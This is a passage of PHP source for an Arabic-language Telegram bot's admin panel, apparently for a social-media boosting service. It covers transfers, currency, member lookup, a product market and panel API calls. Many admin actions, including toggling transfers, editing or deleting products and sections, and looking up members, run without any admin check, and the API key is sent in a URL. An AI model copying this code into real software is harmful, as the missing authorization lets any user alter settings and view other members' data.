]);
$rshq['mode'][$from_id] = "set_channel_proof";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "set_channel_proof"){
$rshq['channel_proof_text'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين كليشه الاثبات في القنوات بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "open_transfer"){
$rshq['transfer_status'] = "on";
SETJSON($rshq);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم فتح التحويلات بنجاح ✅
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"gift_settings"]],
]
])
]);
}
if($data == "close_transfer"){
$rshq['transfer_status'] = "off";
SETJSON($rshq);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*تم قفل التحويلات بنجاح ❌
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>$NamesBACK,'callback_data'=>"gift_settings"]],
]
])
]);
}
if($data == "set_min_transfer"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل اقل حد للتحويل بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "set_min_transfer";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_min_transfer"){
$rshq['min_transfer'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين اقل حد للتحويل: $text $currency_name
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "rshq_toggle"){
$key = ['inline_keyboard' => []];
$status = ($rshq['rshqG'] == "on") ? "✅ مفتوح" : "❌ مقفل";
$key['inline_keyboard'][] = [['text' => "فتح استقبال الرشق", 'callback_data' => "onrshq"]];
$key['inline_keyboard'][] = [['text' => "قفل استقبال الرشق", 'callback_data' => "ofrshq"]];
$key['inline_keyboard'][] = [['text' => "الحاله الحاليه: $status", 'callback_data' => "noop"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "general_settings"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*التحكم في استقبال الرشق
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "free_toggle"){
$key = ['inline_keyboard' => []];
$status = ($rshq['FREE'] == "TR") ? "✅ مفتوح" : "❌ مقفل";
$key['inline_keyboard'][] = [['text' => "فتح القسم المجاني", 'callback_data' => "onfr"]];
$key['inline_keyboard'][] = [['text' => "قفل القسم المجاني", 'callback_data' => "offr"]];
$key['inline_keyboard'][] = [['text' => "الحاله الحاليه: $status", 'callback_data' => "noop"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "general_settings"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*التحكم في القسم المجاني
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "general_settings"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*الاعدادات العامة للبوت
يمكنك التحكم في جميع الاعدادات من هنا
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($general_settings)
]);
}
if($data == "gift_settings"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*اعدادات الهدايا والتحويلات
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($gift_settings)
]);
}
if($data == "member_control"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*التحكم بالاعضاء
يمكنك ادارة الاعضاء من هنا
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($member_control)
]);
}
if($data == "member_info"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل ايدي العضو للحصول على معلوماته
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "get_member_info";
SETJSON($rshq);
}
if($data == "member_orders"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل ايدي العضو لعرض اخر 5 طلبات له
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = "get_member_orders";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "get_member_info"){
$member_id = $text;
$member_coin = $rshq["coin"][$member_id] ?? 0;
$member_share = $rshq["mshark"][$member_id] ?? 0;
$member_tlby = $rshq["tlby"][$member_id] ?? 0;
$member_cointlb = $rshq["cointlb"][$member_id] ?? 0;
$member_info_text = "*معلومات العضو*:\n\n";
$member_info_text .= "🆔 الايدي: `$member_id`\n";
$member_info_text .= "👤 اليوزر: ";
$member_info = bot("getchat",['chat_id'=>$member_id]);
if($member_info->result->username){
$member_info_text .= "@".$member_info->result->username."\n";
}else{
$member_info_text .= "لا يوجد\n";
}
$member_info_text .= "📛 الاسم: ".($member_info->result->first_name ?? "غير معروف")."\n";
$member_info_text .= "💰 الرصيد: $member_coin $currency_name\n";
$member_info_text .= "📊 الرصيد المستخدم: $member_cointlb $currency_name\n";
$member_info_text .= "👥 عدد الدعوات: $member_share\n";
$member_info_text .= "📦 عدد الطلبات: $member_tlby\n";
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>$member_info_text,
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "get_member_orders"){
$member_id = $text;
$orders_text = "*اخر 5 طلبات للعضو `$member_id`*:\n\n";
$orders_list = $rshq["orders"][$member_id] ?? [];
$orders_count = count($orders_list);
$start_index = max(0, $orders_count - 5);
$counter = 1;
for($i = $start_index; $i < $orders_count; $i++){
$orders_text .= "$counter- ".$orders_list[$i]."\n";
$counter++;
}
if($orders_count == 0){
$orders_text .= "لا توجد طلبات لهذا العضو";
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>$orders_text,
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "set_currency"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل اسم العمله الجديده للبوت\nمثال: نقاط, كريدت, رصيد\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id] = "set_currency";
SETJSON($rshq);
}if($text and $rshq['mode'][$from_id] == "set_currency"){
$rshq['currency'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين عمله البوت الى: $text بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($rshq['AKTHAR']==null){
$AKTHAR=20;
}else{
$AKTHAR = $rshq['AKTHAR'];
}
if($rshq['min_transfer']==null){
$min_transfer=10;
}else{
$min_transfer = $rshq['min_transfer'];
}
if($rshq["HDIA"] == null or $rshq["HDIA"] == "on"){
$HDIAS = "الهديه اليوميه";
$mj = "✅";
}else{
$HDIAS = null;
$mj = "❌";
}
if($data == "rshqG") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
$rsedi = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=balance"));
$flos = $rsedi->balance;
$treqa = $rsedi->currency;
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*- اهلا لك عزيزي الادمن في لوحه المطور 📝
----------------------------*
• عمله البوت : *$currency_name*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($adm)
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($text == "/sدtart") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
$rsedi = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=balance"));
$flos = $rsedi->balance;
$treqa = $rsedi->currency;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*- اهلا لك عزيزي الادمن في لوحه المطور 📝
----------------------------*
• عمله البوت : *$currency_name*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($adm)
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($data == "VIPME") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* قسم الكلايش يمكنك التحكم في الكليشات
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnvip)
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($data == "settext"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل كليشه الشروط الان\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($data == "msfrn"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل ايدي الشخص لتصفير نقاطه
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id]== "msfrn"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تصفير نقاط $text
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq["coin"][$text] = 0;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($data == "setname"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل اسم البوت الان .\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($data == "setcha"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل يوزر القناة الان مع @
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($data == "setbuy"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل كليشه شراء رصيد الان\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($data == "setshare"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل عدد النقاط الان\nنقاط مشاركه رابط لدعوه،\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}if(is_numeric($text) and $rshq['mode'][$from_id]== "setshare"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين عدد النقاط بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq["coinshare"] = $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id]== "setbuy"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين الكليشه بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['buy']= $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
$chabot = $rshq['cha']; if ($chabot == null){$chabot = "sero_bots";}
if($text and $rshq['mode'][$from_id]== "setname"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين اسم البوت بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['namebot']= $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
$nambot = $rshq['namebot']; if($nambot == null){$nambot = "خدماتي - Khadamti";}
if($text and $rshq['mode'][$from_id]== "settext"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين الكليشه بنجاح\n*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⬅️ رجوع",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['KLISHA']= $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id]== "setcha"){
if(true){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين القناة بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($admnb)
]);
$rshq['cha']= str_replace("@","",$text);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if ($data == "offr") {
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "* تم القفل
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'رجوع', 'callback_data' => "general_settings"]],
]
])
]);
$rshq['mode'][$from_id] = null;
$rshq['FREE'] = null;
SETJSON($rshq);
}
}
if ($data == "onfr") {
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "* تم الفتح
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'رجوع', 'callback_data' => "general_settings"]],
]
])
]);
$rshq['mode'][$from_id] = null;
$rshq['FREE'] = "TR";
SETJSON($rshq);
}
}


if($data == "market_sections"){
$key = ['inline_keyboard' => []];
if(isset($rshq['market_sections'])){
foreach($rshq['market_sections'] as $code => $section){
$key['inline_keyboard'][] = [['text' => $section['name'], 'callback_data' => "market_edit|$code"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه قسم جديد", 'callback_data' => "add_market_section"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*اقسام ماركت البوت
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "add_market_section"){
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل اسم القسم الجديد
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "market_sections"]],
]
])
]);
$rshq['mode'][$from_id] = "add_market_section";
SETJSON($rshq);
}

if($text and $rshq['mode'][$from_id] == "add_market_section"){

$emoji_id = null;

if(isset($update->message->entities)){
foreach($update->message->entities as $ent){
if($ent->type == "custom_emoji"){
$emoji_id = $ent->custom_emoji_id;

$offset = $ent->offset;
$length = $ent->length;

$text = mb_substr($text, 0, $offset) . mb_substr($text, $offset + $length);
}
}
}

if($emoji_id){
$text = preg_replace('/[\x{1F300}-\x{1FAFF}]/u', '', $text);
}

$text = trim($text);

$code = "market_".rand(100000,999999);

$rshq['market_sections'][$code] = [
'name' => $text,
'products' => []
];

if($emoji_id){
$rshq['market_sections'][$code]['emoji'] = $emoji_id;
}

SETJSON($rshq);

bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم اضافه قسم $text بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"market_sections"]],
]
])
]);

$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "market_edit"){
$code = explode("|",$data)[1];
$key = ['inline_keyboard' => []];
if(isset($rshq['market_sections'][$code]['products'])){
foreach($rshq['market_sections'][$code]['products'] as $pcode => $product){
$key['inline_keyboard'][] = [['text' => $product['name'], 'callback_data' => "product_edit|$code|$pcode"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه منتج جديد", 'callback_data' => "add_product|$code"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "market_sections"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*قسم: ".$rshq['market_sections'][$code]['name']."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if(explode("|",$data)[0] == "add_product"){
$code = explode("|",$data)[1];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل اسم المنتج
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "market_edit|$code"]],
]
])
]);
$rshq['mode'][$from_id] = "add_product_name";
$rshq['temp_market_code'] = $code;
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "add_product_name"){
$code = $rshq['temp_market_code'];
$pcode = "product_".rand(100000,999999);
$rshq['market_sections'][$code]['products'][$pcode] = [
'name' => $text,
'price' => 0,
'description' => ""];
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم اضافه المنتج $text
الان قم بتعيين سعر المنتج
ارسل السعر بالارقام فقط
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"market_edit|$code"]],
]
])
]);
$rshq['mode'][$from_id] = "set_product_price";
$rshq['temp_product_code'] = $pcode;
$rshq['temp_market_code'] = $code;
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "set_product_price"){
$code = $rshq['temp_market_code'];
$pcode = $rshq['temp_product_code'];
$rshq['market_sections'][$code]['products'][$pcode]['price'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين السعر: $text
الان قم بتعيين وصف المنتج
ارسل الوصف
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"market_edit|$code"]],
]
])
]);
$rshq['mode'][$from_id] = "set_product_desc";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "set_product_desc"){
$code = $rshq['temp_market_code'];
$pcode = $rshq['temp_product_code'];
$rshq['market_sections'][$code]['products'][$pcode]['description'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين الوصف بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"market_edit|$code"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "product_edit"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
$product = $rshq['market_sections'][$code]['products'][$pcode];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "تعيين السعر", 'callback_data' => "edit_product_price|$code|$pcode"]];
$key['inline_keyboard'][] = [['text' => "تعيين الوصف", 'callback_data' => "edit_product_desc|$code|$pcode"]];
$key['inline_keyboard'][] = [['text' => "حذف المنتج", 'callback_data' => "delete_product|$code|$pcode"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "market_edit|$code"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*المنتج: ".$product['name']."
السعر: ".$product['price']." $currency_name
الوصف: ".$product['description']."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if(explode("|",$data)[0] == "edit_product_price"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل السعر الجديد بالارقام فقط
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "product_edit|$code|$pcode"]],
]
])
]);
$rshq['mode'][$from_id] = "edit_product_price";
$rshq['temp_market_code'] = $code;
$rshq['temp_product_code'] = $pcode;
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "edit_product_price"){
$code = $rshq['temp_market_code'];
$pcode = $rshq['temp_product_code'];
$rshq['market_sections'][$code]['products'][$pcode]['price'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين السعر الجديد: $text $currency_name
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"product_edit|$code|$pcode"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "edit_product_desc"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل الوصف الجديد
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "product_edit|$code|$pcode"]],
]
])
]);
$rshq['mode'][$from_id] = "edit_product_desc";
$rshq['temp_market_code'] = $code;
$rshq['temp_product_code'] = $pcode;
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "edit_product_desc"){
$code = $rshq['temp_market_code'];
$pcode = $rshq['temp_product_code'];
$rshq['market_sections'][$code]['products'][$pcode]['description'] = $text;
SETJSON($rshq);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*تم تعيين الوصف الجديد
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"product_edit|$code|$pcode"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "delete_product"){
$code = explode("|",$data)[1];
$pcode = explode("|",$data)[2];
unset($rshq['market_sections'][$code]['products'][$pcode]);
SETJSON($rshq);
$key = ['inline_keyboard' => []];
if(isset($rshq['market_sections'][$code]['products'])){
foreach($rshq['market_sections'][$code]['products'] as $pcode => $product){
$key['inline_keyboard'][] = [['text' => $product['name'], 'callback_data' => "product_edit|$code|$pcode"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه منتج جديد", 'callback_data' => "add_product|$code"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "market_sections"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*قسم: ".$rshq['market_sections'][$code]['name']."
تم حذف المنتج
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
if($data == "qsmsa"){
$key = ['inline_keyboard' => []];
foreach ($rshq['qsm'] as $i) {
$nameq = explode("-",$i)[0];
$i = explode("-",$i)[1];
if($rshq['IFWORK>'][$i] != "NOT"){
$timer_status = ($rshq['section_timer'][$i] == "on") ? "⏰✅" : "⏰❌";
$key['inline_keyboard'][] = [['text' => "$nameq", 'callback_data' => "edits|$i"], ['text' => "$timer_status", 'callback_data' => "section_timer|$i"], ['text' => "🗑", 'callback_data' => "delets|$i"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه قسم جديد", 'callback_data' => "addqsm"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "rshqG"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*الاقسام الموجوده في البوت
⏰✅ التفعيل يعني نظام 24 ساعه مفعل علي كل خدمات القسم
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0] == "section_timer"){
$section_id = explode("|",$data)[1];
if($rshq['section_timer'][$section_id] == "on"){
$rshq['section_timer'][$section_id] = "off";
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*تم تعطيل نظام ال 24 ساعه لهذا القسم ❌
يمكن للاعضاء طلب الخدمات من هذا القسم بدون انتظار
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "qsmsa"]],
]
])
]);
}else{
$rshq['section_timer'][$section_id] = "on";
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*تم تفعيل نظام ال 24 ساعه لهذا القسم ✅
لا يمكن للعضو طلب اي خدمه من هذا القسم الا بعد 24 ساعه من اخر طلب
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "$NamesBACK", 'callback_data' => "qsmsa"]],
]
])
]);
}
SETJSON($rshq);
}
if(explode("|",$data)[0] == "delets"){
$rshq['IFWORK>'][explode("|",$data)[1]] = "NOT";
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
foreach ($rshq['qsm'] as $i) {
$nameq = explode("-",$i)[0];
$i = explode("-",$i)[1];
if($rshq['IFWORK>'][$i] != "NOT"){
$timer_status = ($rshq['section_timer'][$i] == "on") ? "⏰✅" : "⏰❌";
$key['inline_keyboard'][] = [['text' => "$nameq", 'callback_data' => "edits|$i"], ['text' => "$timer_status", 'callback_data' => "section_timer|$i"], ['text' => "🗑", 'callback_data' => "delets|$i"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه قسم جديد", 'callback_data' => "addqsm"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*الاقسام الموجوده في البوت
⏰✅ التفعيل يعني نظام 24 ساعه مفعل علي كل خدمات القسم
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
function getServices($site, $key){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$site/api/v2");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
"key" => $key,
"action" => "services"
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$res = curl_exec($ch);
return json_decode($res, true);
}
if(explode("|",$data)[0]=="edits"){
$key = ['inline_keyboard' => []];
$vv = rand(100,900);
foreach ( $rshq['xdmaxs'][explode("|",$data)[1]] as $hjjj => $i) {
$key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|".explode("|",$data)[1]."|$hjjj"], ['text' => "", 'callback_data' => "delets|".explode("|",$data)[1]."|$hjjj"]];
}
$kilwaBots = explode("|",$data)[1];
$key['inline_keyboard'][] = [['text' => "+ اضافه خدمات الي هذا القسم", 'callback_data' => "add|$kilwaBots"]];
$key['inline_keyboard'][] = [['text' => "📥 سحب خدمات من الموقع", 'callback_data' => "getapi|$kilwaBots|0"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*الخدمات الموجوده في قسم *".$rshq['NAMES'][explode("|",$data)[1]]."*
نظام 24 ساعه: ".($rshq['section_timer'][explode("|",$data)[1]] == "on" ? "✅ مفعل" : "❌ معطل")."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['idTIMER'][$vv] = $rshq['NAMES'][explode("|",$data)[1]];
SETJSON($rshq);
}
if(explode("|",$data)[0] == "getapi"){

$section_id = explode("|",$data)[1];
$page = explode("|",$data)[2];

$services = getServices($rshq["sSite"], $rshq["sToken"]);

$per_page = 20;
$start = $page * $per_page;
$slice = array_slice($services, $start, $per_page);

$key = ['inline_keyboard'=>[]];

foreach($slice as $i => $srv){
$id = $srv['service'];
$name = $srv['name'];

